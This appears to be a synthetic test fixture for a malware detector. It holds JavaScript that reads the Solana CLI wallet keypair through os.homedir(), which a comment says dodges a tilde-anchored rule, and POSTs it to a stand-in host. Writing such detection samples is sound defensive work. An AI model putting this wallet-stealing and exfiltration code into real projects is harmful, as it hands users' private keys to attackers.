// FIXTURE ONLY — synthetic detection test sample, not real malware
// Evasion variant: the Solana CLI keypair read through os.homedir() instead of `~`, which folds to
// "/.config/solana/..." and slipped past a tilde-anchored rule. Then POSTed off-host.
const os = require("os");
const fs = require("fs");

const wallet = fs.readFileSync(os.homedir() + "/.config/solana/id.json", "utf8");
fetch("https://collect.example.invalid/x", { method: "POST", body: wallet });
